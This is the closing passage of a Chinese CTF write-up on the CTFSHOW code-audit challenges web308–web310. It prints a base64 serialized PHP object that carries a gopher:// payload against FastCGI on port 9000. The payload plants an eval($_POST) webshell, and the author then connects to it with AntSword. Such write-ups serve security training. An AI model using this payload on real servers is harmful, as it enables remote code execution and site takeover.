class="line">TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czo2NDk6ImdvcGhlcjovLzEyNy4wLjAuMTo5MDAwL18lMDElMDElMDAlMDElMDAlMDglMDAlMDAlMDAlMDElMDAlMDAlMDAlMDAlMDAlMDAlMDElMDQlMDAlMDElMDElMDQlMDQlMDAlMEYlMTBTRVJWRVJfU09GVFdBUkVnbyUyMC8lMjBmY2dpY2xpZW50JTIwJTBCJTA5UkVNT1RFX0FERFIxMjcuMC4wLjElMEYlMDhTRVJWRVJfUFJPVE9DT0xIVFRQLzEuMSUwRSUwMkNPTlRFTlRfTEVOR1RIOTIlMEUlMDRSRVFVRVNUX01FVEhPRFBPU1QlMDlLUEhQX1ZBTFVFYWxsb3dfdXJsX2luY2x1ZGUlMjAlM0QlMjBPbiUwQWRpc2FibGVfZnVuY3Rpb25zJTIwJTNEJTIwJTBBYXV0b19wcmVwZW5kX2ZpbGUlMjAlM0QlMjBwaHAlM0EvL2lucHV0JTBGJTE3U0NSSVBUX0ZJTEVOQU1FL3Zhci93d3cvaHRtbC9pbmRleC5waHAlMEQlMDFET0NVTUVOVF9ST09ULyUwMCUwMCUwMCUwMCUwMSUwNCUwMCUwMSUwMCUwMCUwMCUwMCUwMSUwNSUwMCUwMSUwMCU1QyUwNCUwMCUzQyUzRnBocCUyMHN5c3RlbSUyOCUyN2VjaG8lMjAlMjIlM0MlM0ZwaHAlMjBldmFsJTI4JTVDJTI0X1BPU1QlNUIxJTVEJTI5JTNCJTNGJTNFJTIyJTIwJTNFJTIwMS5waHAlMjclMjklM0JkaWUlMjglMjctLS0tLU1hZGUtYnktU3B5RDNyLS0tLS0lMEElMjclMjklM0IlM0YlM0UlMDAlMDAlMDAlMDAiO319</span><br></pre></td></tr></table></figure>
+
+<p>把结果写入Cookie即可，路径是<code>/index.php</code>，参数是<code>service</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808182623011.png"></p>
+<p>然后蚁剑连接即可</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808183121097.png"></p>
+<h3 id="web310"><a href="#web310" class="headerlink" title="web310"></a>web310</h3><p>附件还是跟web308一样</p>
+<p>方法和上题相同，也是用Gopher协议打<strong>FastCGI</strong></p>
+<p>把结果写入Cookie，路径是<code>/index.php</code>，参数是<code>service</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808183718425.png"></p>
+<p>连接蚁剑webshell，但是这次flag不在<code>/var/www/html</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808183935633.png"></p>
+<p>找了一下，发现flag在<code>/var/flag</code>目录</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808184043891.png"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>Jay 17：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/133146315">https://blog.csdn.net/Jayjay___/article/details/133146315</a></p>
+</div><div class="article-licensing box"><div class="licensing-title"><p>CTFSHOW | 代码审计 web301 - web310</p><p><a href="https://waynejoon.github.io/posts/ctfshow-code-audit-web301-web310/">https://waynejoon.github.io/posts/ctfshow-code-audit-web301-web310/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>WayneJoon.H</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2025-08-08</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/CTFSHOW/">CTFSHOW, </a><a class="link-muted" rel="tag" href="/tags/CTF%E7%BB%83%E4%B9%A0/">CTF练习 </a></div></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/posts/Xuanji-CTF-Godzilla-Traffic-Analysis/"><span class="level-item">玄机靶场 | 哥斯拉4.0流量分析</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/waynejoon.jpg" alt="WayneJoon.H"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">WayneJoon.H</p><p class="is-size-6 is-block">记录学习生活</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives/"><p class="title">10</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories/"><p class="title">3</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags/"><p class="title">5</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/waynejoon" target="_blank" rel="me noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/waynejoon"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#什么是代码审计"><span class="level-left"><span class="level-item">1</span><span class="level-item">什么是代码审计</span></span></a></li><li><a class="level is-mobile" href="#代码审计一般思路"><span class="level-left"><span class="level-item">2</span><span class="level-item">代码审计一般思路</span></span></a></li><li><a class="level is-mobile" href="#题目列表"><span class="level-left"><span class="level-item">3</span><span class="level-item">题目列表</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#web301"><span class="level-left"><span class="level-item">3.1</span><span class="level-item">web301</span></span></a></li><li><a class="level is-mobile" href="#web302"><span class="level-left"><span class="level-item">3.2</span><span class="level-item">web302</span></span></a></li><li><a class="level is-mobile" href="#web303"><span class="level-left"><span class="level-item">3.3</span><span class="level-item">web303</span></span></a></li><li><a class="level is-mobile" href="#web304"><span class="level-left"><span class="level-item">3.4</span><span class="level-item">web304</span></span></a></li><li><a class="level is-mobile" href="#web305"><span class="level-left"><span class="level-item">3.5</span><span class="level-item">web305</span></span></a></li><li><a class="level is-mobile" href="#web306"><span class="level-left"><span class="level-item">3.6</span><span class="level-item">web306</span></span></a></li><li><a class="level is-mobile" href="#web307"><span class="level-left"><span class="level-item">3.7</span><span class="level-item">web307</span></span></a></li><li><a class="level is-mobile" href="#web308"><span class="level-left"><span class="level-item">3.8</span><span class="level-item">web308</span></span></a></li><li><a class="level is-mobile" href="#web309"><span class="level-left"><span class="level-item">3.9</span><span class="level-item">web309</span></span></a></li><li><a class="level is-mobile" href="#web310"><span class="level-left"><span class="level-item">3.10</span><span class="level-item">web310</span></span></a></li></ul></li><li><a class="level is-mobile" href="#参考"><span class="level-left"><span class="level-item">4</span><span class="level-item">参考</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">WayneJH</a><p class="is-size-7"><span>&copy; 2025 WayneJoon.H</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">共<span id="busuanzi_value_site_uv">0</span>个访客</span></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="GitHub" href="https://github.com/waynejoon"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script data-pjax src="/js/column.js"></script><script data-pjax src="/js/busuanzi-fix.js" defer></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script data-pjax src="/js/insight.js" defer></script><script data-pjax>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script></body></html>
